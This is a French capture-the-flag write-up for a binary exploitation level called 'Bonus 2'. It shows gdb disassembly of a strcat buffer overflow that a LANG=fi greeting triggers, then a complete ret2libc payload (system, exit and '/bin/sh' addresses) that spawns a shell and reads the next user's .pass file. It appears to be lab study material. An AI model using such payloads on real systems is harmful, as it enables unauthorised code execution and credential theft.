## Bonus 2

### Analyse
main requiert exactement 2 arguments, copie argv[1] (max 40 bytes) et argv[2] (max 32 bytes) dans un buffer de 76 bytes. Il lit la variable d'environnement LANG et set une variable globale language : 1 si "fi", 2 si "nl". Ensuite il appelle greetuser.

```bash
(gdb) x/s 0x8048738  →  "LANG"
(gdb) x/s 0x804873d  →  "fi"
(gdb) x/s 0x8048740  →  "nl"

   0x08048577 <+78>:    call   strncpy   # argv[1] → buf, max 40 bytes
   0x0804859a <+113>:   call   strncpy   # argv[2] → buf+40, max 32 bytes
   0x080485df <+182>:   movl   $0x1,0x8049988  # language = 1 (fi)
   0x0804860e <+229>:   movl   $0x2,0x8049988  # language = 2 (nl)
```
greetuser copie un greeting dans un buffer local de 72 bytes (ebp-0x48) selon language, puis fait un strcat du buffer de main dedans — overflow possible.

```bash
(gdb) x/s 0x8048710  →  "Hello "          # language = 0 (6 bytes)
(gdb) x/s 0x8048717  →  "Hyvää päivää "  # language = 1 (19 bytes, fi)
(gdb) x/s 0x804872a  →  "Goedemiddag! "  # language = 2 (14 bytes, nl)
```

Avec LANG=fi, le greeting fait 19 bytes, ce qui décale le buffer et permet d'écraser EIP avec 18 bytes dans argv[2].

### Exploitation
```bash
(gdb) find 0xb7e2c000,0xb7fcf000,"/bin/sh"  →  0xb7f8cc58
(gdb) info function system               →  0xb7e6b060
(gdb) info function exit                 →  0xb7e5ebe0
```

Payload dans argv[2] : 18 bytes de padding + system + exit + "/bin/sh".

```bash
LANG=fi ./bonus2 $(python -c 'print "A"*200') $(python -c 'print "B"*18+"\x60\xb0\xe6\xb7"+"\xe0\xeb\xe5\xb7"+"\x58\xcc\xf8\xb7"')

cat /home/user/bonus3/.pass
```
